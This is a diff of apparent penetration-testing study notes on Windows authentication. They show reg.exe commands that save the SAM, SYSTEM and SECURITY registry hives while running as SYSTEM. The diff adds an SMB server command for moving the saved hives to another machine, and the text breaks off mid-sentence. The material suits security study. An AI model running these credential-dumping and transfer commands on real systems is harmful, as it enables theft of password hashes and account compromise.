@@ -1,6 +1,6 @@
 THESE 3 ARE LIKE THE THREE PILLARS BEHIND WINDOWS AUTHENTICATION 
 
-ASSUMING WE HAVE SHELL AS `NT AUTHORITY\SYSTEM` 
+ASSUMING WE HAVE SHELL AS `NT AUTHORITY\SYSTEM` download the hive files 
 	`reg.exe` is a command line registry tool that lets us query,add,delete,recover, save, export, import registry keys and values  from pwsh.  Works on remote machines (HKLM/HKU only).
 ```cmd 
 reg.exe save hklm\sam C:\sam.save 
@@ -8,6 +8,11 @@ reg.exe save hklm\system C:\sys.save
 reg.exe save hklm\security C:\sec.save
 ```
 
+Set up an smbserver for transfer 
+```bash
+python3 smbserver.py --smb2support SHARENAME /path/to/save
+```
+download the files on 
 - They are `registry hive files`
 - They live under `C:\Windows\System32\config`
 	- `C:\Windows\System32\config\SAM`
